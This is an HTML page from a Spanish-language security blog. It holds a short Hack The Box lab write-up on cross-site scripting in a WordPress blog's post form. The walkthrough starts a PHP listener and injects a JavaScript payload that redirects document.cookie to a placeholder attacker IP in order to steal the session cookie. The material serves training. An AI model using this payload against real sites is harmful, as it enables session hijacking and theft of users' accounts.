<!DOCTYPE html>
<html lang="en-us">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><title>
    
    Laboratorio De XSS | 
    
    CHL Blog
</title>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<link rel="canonical" href="http://localhost:1313/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-xss/" />
<link rel="icon" type="image/png" href="http://localhost:1313/image/favicon.ico">


<meta name="description" content="
    Exploramos la aplicación, identificamos un formulario que permite inyectar código malicioso en los campos de entrada. Usamos un payload de JavaScript para redirigir las cookies de sesión hacia nuestro servidor. Obteniendo la cookie que contenía la flag.
    "
/>
<meta property="og:description" content="
    Exploramos la aplicación, identificamos un formulario que permite inyectar código malicioso en los campos de entrada. Usamos un payload de JavaScript para redirigir las cookies de sesión hacia nuestro servidor. Obteniendo la cookie que contenía la flag.
    " 
/>




<meta property="og:title" content="Laboratorio de XSS" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-xss/" /><meta property="article:section" content="pagina_web" />
<meta property="article:published_time" content="2025-08-30T00:00:00+00:00" />
<meta property="article:modified_time" content="2025-08-30T00:00:00+00:00" />





  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Laboratorio de XSS">
  <meta name="twitter:description" content="Exploramos la aplicación, identificamos un formulario que permite inyectar código malicioso en los campos de entrada. Usamos un payload de JavaScript para redirigir las cookies de sesión hacia nuestro servidor. Obteniendo la cookie que contenía la flag.">


  <meta itemprop="name" content="Laboratorio de XSS">
  <meta itemprop="description" content="Exploramos la aplicación, identificamos un formulario que permite inyectar código malicioso en los campos de entrada. Usamos un payload de JavaScript para redirigir las cookies de sesión hacia nuestro servidor. Obteniendo la cookie que contenía la flag.">
  <meta itemprop="datePublished" content="2025-08-30T00:00:00+00:00">
  <meta itemprop="dateModified" content="2025-08-30T00:00:00+00:00">
  <meta itemprop="wordCount" content="293">
  <meta itemprop="keywords" content="Hackthebox,XSS,Web">




<link rel="stylesheet" href="http://localhost:1313/main.min.css">





<script src="http://localhost:1313/bundle.js"></script>







<script data-ad-client="adsense-key" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>









</head>

<body><header id="header">
  <div class="top-bar">
    <div class="container-md">

      <div class="row align-items-center">
        <div class="col-3 col-sm-4 social-buttons d-none d-sm-block">
          <ul>
    
    

    
    <li>
        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
            <i class="fab fa-youtube"></i></a>
    </li>
    

    
    <li>
        <a href="https://www.instagram.com/19chl96/" target="_blank">
            <i class="fab fa-instagram"></i></a>
    </li>
    

    
    <li>
        <a href="https://github.com/chernadez321" target="_blank">
            <i class="fab fa-github"></i></a>
    </li>
    

    

    
    <li>
        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
            <i class="fab fa-linkedin"></i></a>
    </li>
    

</ul>
        </div>

        <div class="ra-toggler col-3 col-sm-4 d-block d-sm-none">
          <button class="bg-dark" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
            <i class="fas fa-bars"></i>
          </button>
        </div>

        <div class="col-6 col-sm-4">
          <h2 class="title"><a href="http://localhost:1313/">CHL Blog</a></h2>
        </div>

        
        <div class="col-3 col-sm-4">
          <div class="col col-md-8 offset-md-4 d-none d-sm-block">
            <form id="cse-search-box-form-id" class="input-group search-bar" onsubmit="return executeQuery('lg');"
              role="search">
              <input id="cse-search-input-box-id" type="text" class="form-control" placeholder="Search">
              <button class="btn" type="submit">
                <i class="fa fa-search"></i>
              </button>
            </form>
          </div>
        </div>
        

      </div>
    </div>
  </div>

  <div class="container-md">
    <nav class="navbar navbar-expand-sm navbar-dark bg-dark sticky-top">
      <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav mx-auto">

          <li class="nav-item d-block d-sm-none">
            <ul class="social-buttons">
              <ul>
    
    

    
    <li>
        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
            <i class="fab fa-youtube"></i></a>
    </li>
    

    
    <li>
        <a href="https://www.instagram.com/19chl96/" target="_blank">
            <i class="fab fa-instagram"></i></a>
    </li>
    

    
    <li>
        <a href="https://github.com/chernadez321" target="_blank">
            <i class="fab fa-github"></i></a>
    </li>
    

    

    
    <li>
        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
            <i class="fab fa-linkedin"></i></a>
    </li>
    

</ul>
            </ul>
          </li>

          
          
          <li class="nav-item">
            <a class="nav-link 
              
              " 
              href="http://localhost:1313/">
              Home
            </a>
          </li>
          
          
          
          <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown">
              Blog
            </a>
            <div class="dropdown-menu">
              
              
                <a class="dropdown-item" href="http://localhost:1313/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
              
              
              
                <a class="dropdown-item" href="http://localhost:1313/pagina_web/blog/write-ups/">Write-ups</a>
              
              
              
                <div class="dropdown-divider"></div>
              
              
              
                <a class="dropdown-item" href="http://localhost:1313/tags/">Búsqueda por etiquetas</a>
              
              
            </div>
          </li>
          
          
          
          <li class="nav-item">
            <a class="nav-link 
              
              " 
              href="http://localhost:1313/pagina_web/trayectoria/">
              Trayectoria
            </a>
          </li>
          
          
          
          <li class="nav-item">
            <a class="nav-link 
              
              " 
              href="http://localhost:1313/pagina_web/contact/">
              Contacto
            </a>
          </li>
          
          
        </ul>

        
        <form id="cse-search-box-form-id2" class="d-flex search-bar d-block d-sm-none"
          onsubmit="return executeQuery('xs');" role="search">
          <input id="cse-search-input-box-id2" type="text" class="form-control" placeholder="Search">
          <button class="btn" type="submit">
            <i class="fa fa-search"></i>
          </button>
        </form>
        

      </div>
    </nav>
  </div>
</header>

<main class="blog-content">
    <div class="container-md">
        <div class="row">
            
            <div class="col-lg-2 d-none d-xl-block">
                <div class="ad-left-offset"></div>
                
            </div>

            <div class="col-md-12 col-lg-8 px-lg-4">
                

                <h1 class="title">Laboratorio de XSS</h1>

                <div class="container-fluid px-0 mb-4">
                    <div class="row align-items-end">
                        <div class="col-md-4 date-time">
                            <span class="date">
    Aug 30, 2025
</span>
                            &centerdot;
                            <span class="time-to-read">
    2 mins read</span>
                        </div>

                        <div class="col-md-8 tags ">
                            
                            <a href="http://localhost:1313/tags/hackthebox"><span
                                    class="tag bg-dark">hackthebox</span></a>
                            
                            <a href="http://localhost:1313/tags/xss"><span
                                    class="tag bg-dark">XSS</span></a>
                            
                            <a href="http://localhost:1313/tags/web"><span
                                    class="tag bg-dark">web</span></a>
                            
                        </div>
                    </div>
                </div>

                

                <p><img src="../../../../../images/Miniaturas/XSS.png" alt=""></p>
<h4 id="enunciado">Enunciado</h4>
<p>Estamos realizando una prueba de penetración de aplicaciones web para una empresa que lo contrató y que acaba de lanzar su nuevo [ <code>Security Blog</code>nombre del sitio]. En nuestro plan de pruebas de penetración de aplicaciones web, llegamos a la parte donde debe probar la aplicación web contra vulnerabilidades de secuencias de comandos entre sitios (XSS).</p>
<p>Inicie el servidor a continuación, asegúrese de estar conectado a la VPN y acceda al <code>/assessment</code>directorio en el servidor usando el navegador.</p>
<p>Aplica las habilidades que aprendiste en este módulo para lograr lo siguiente:</p>
<ol>
<li>Identificar un campo de entrada de usuario que sea vulnerable a una vulnerabilidad XSS</li>
<li>Encuentre una carga útil XSS que funcione y que ejecute código JavaScript en el navegador del destino</li>
<li>Usando las <code>Session Hijacking</code>técnicas, intenta robar las cookies de la víctima, que deben contener la bandera.</li>
</ol>
<p><strong>¿Cuál es el valor de la cookie &lsquo;bandera&rsquo;?</strong>
Primero visitamos la ruta que nos dicen y de primeras vemos un blog wordpress.
<img src="../../../../../images/HTB_modulos/XSS_htb_lab_1/flag_1-1.png" alt="">
Empezamos a buscar campos en los que tengamos capacidad de introducir datos para ver si vemos alguno vulnerable a <code>XSS</code>.
Vemos que tenemos acceso a otra página del blog
<img src="../../../../../images/HTB_modulos/XSS_htb_lab_1/flag_1-2.png" alt="">
Al final de la misma página vemos que tenemos un formulatio para postear contenido en el blog.
Con varios campos.
<img src="../../../../../images/HTB_modulos/XSS_htb_lab_1/flag_1-3.png" alt="">
En ellos vamos a probar con lo que nos habían comentado en el enunciado de la <code>Session Hijacking</code>.
Vamos a ponernos en escucha en nuestra máquina local</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php -S 0.0.0.0:80
</span></span></code></pre></div><p>Insertamos el payload en cada campo exepto el email.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>document.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://OUR_IP?c=&#39;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>;
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/XSS_htb_lab_1/flag_1-4.png" alt=""></p>
<p>Mientras vemos que cuando hacemos la petición capturamos la cookie de sesión con la flag.</p>
<p><img src="../../../../../images/HTB_modulos/XSS_htb_lab_1/flag_1-5.png" alt=""></p>
<p>Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.</p>


                <div id="social-media-share">
	<p><i>Escríbeme por cualquiera de las vías</i></p>
	
	<div class="share-buttons">
	    
		<a href="https://www.instagram.com/19chl96/" 
   			target="_blank" 
   			title="Sígueme en Instagram">
    		<img src=http://localhost:1313/icons/45px/instagram.png alt="Instagram">
		</a>

		<a  href="https://www.linkedin.com/in/chlinked/"
	        onclick="socialMediaPopUp(this.href, '', 900, 500); return false;"
	        title="Share on LinkedIn. Opens in a new window." >
	        <img src=http://localhost:1313/icons/48px/linkedin.png>
	    </a>

	    <a href="https://mail.google.com/mail/?view=cm&fs=1&to=chlorenzo96@gmail.com&su=Para Carlos&body=Hola." 
   		   target="_blank" 
   		   title="Enviar correo usando Gmail">
    	<img src=http://localhost:1313/icons/48px/email.png alt="Email">
		</a>

		

	</div>
</div>



                
                <br>
                <div id="disqus_thread"></div>
<script type="text/javascript">
    (function () {
        
        
        if (window.location.hostname == "localhost")
            return;

        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        var disqus_shortname = '';
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
            </div>

            <div class="col-lg-2 d-none d-xl-block">
                <div class="ad-right-offset"></div>
                
            </div>
        </div>
    </div>
</main>

<footer class="bg-dark text-light py-4">
    <div class="container-md">
        <div class="row justify-content-center">
            <div class="col-12">
                <nav class="navbar navbar-expand-sm navbar-dark bg-dark justify-content-center">
                    <ul class="navbar-nav">
                        <li class="nav-item">
                            <a class="nav-link" href="http://localhost:1313/">Home</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="http://localhost:1313/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="http://localhost:1313/pagina_web/blog/write-ups/">Write-ups</a>
                        </li>
                    </ul>
                </nav>
            </div>
        </div>
    </div>
    <div class="text-center mt-3">
        <p>© 2025 Carlos Hernández Lorenzo</p>
    </div>
</footer>


<script async src="https://cse.google.com/cse.js?cx=google-cse-key"></script>
<gcse:searchresults-only></gcse:searchresults-only>

</body>

</html>